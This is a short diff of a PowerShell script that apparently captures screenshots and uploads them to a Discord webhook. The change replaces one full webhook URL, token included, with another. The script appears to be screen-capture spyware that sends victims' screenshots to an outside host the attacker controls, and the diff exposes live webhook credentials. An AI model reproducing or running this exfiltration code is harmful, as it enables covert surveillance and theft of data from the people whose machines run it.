@@ -40,7 +40,7 @@ try {
 }
 
 # Upload the screenshot to Discord webhook
-$webhookUrl = 'https://discord.com/api/webhooks/1264663197034610729/-_OMi5NaidSJ5_MUmuZb8q4jW7fm19m7DUjqHWCh5qp8e-xfKarYQXmlfKP2plGB8eWI'
+$webhookUrl = 'https://discord.com/api/webhooks/1266038774689828966/1N__Dh0qQYEUM7GZ1wrdJ7tbahxGp1MI2IxGQuXsRAWI_9zeyLkbRWcCXBGT6o3sLiiF'
 
 # Prepare the file data for upload
 $fileData = @{
